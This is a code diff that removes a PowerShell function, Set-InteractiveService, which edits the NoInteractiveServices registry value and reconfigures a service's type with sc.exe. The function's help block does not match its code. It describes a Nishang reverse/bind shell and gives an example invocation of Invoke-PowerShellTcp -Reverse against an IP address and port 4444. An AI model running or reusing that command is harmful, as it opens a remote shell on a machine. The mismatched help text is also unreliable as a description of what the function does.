@@ -335,55 +335,6 @@ function Set-GroupConfig{
  }
 
 
-function Set-InteractiveService{
-
- <#
- .SYNOPSIS
- Nishang script which can be used for Reverse or Bind interactive PowerShell from a target.
-
- .EXAMPLE
- PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
-
- #>
-    [CmdletBinding(SupportsShouldProcess)]
-    param(
-        [Parameter(Mandatory=$true, ValueFromPipeline=$true, HelpMessage="service Name", Position=0)]
-        [string]$Name,  
-        [Parameter(Mandatory=$true)]
-        [bool]$Interactive 
-    )
-    Write-Warning "DEPRECATED - MAY NOT BE WORKING IN NEWER WINDOWS VERSION > Vista"
-     try{
-        $service = Get-Service -Name $Name -ErrorAction Ignore
-        if(!($service)){ throw "no such service $Name"}
-        $TypeShare = $service.ServiceType -match "Win32ShareProcess"
-        [int]$Val = 0
-        [string]$Type='own'
-        if($TypeShare){
-            [string]$Type='share'
-        }
-        if($False -eq $Interactive){
-            [int]$Val = 1
-        }
-        $RegistryPath="HKLM:\SYSTEM\CurrentControlSet\Control\Windows"
-        $Null = Set-ItemProperty -Path $RegistryPath -Name 'NoInteractiveServices' -Value $Val -Force 
-
-        $ScExe=(get-command sc.exe).Source
-        if($False -eq $Interactive){
-            $OutSc =  &"$ScExe" 'config' "$Name" 'type=' "$Type"
-        }else{
-            $OutSc =  &"$ScExe" 'config' "$Name" 'type=' "$Type" 'type=' 'interact'
-        }
-        
-        Write-Output $OutSc
-
-     }catch{
-        Write-Error $_
-        throw $_
-     }
- }
-
-
 
 function Remove-ServiceGroupConfig{
 
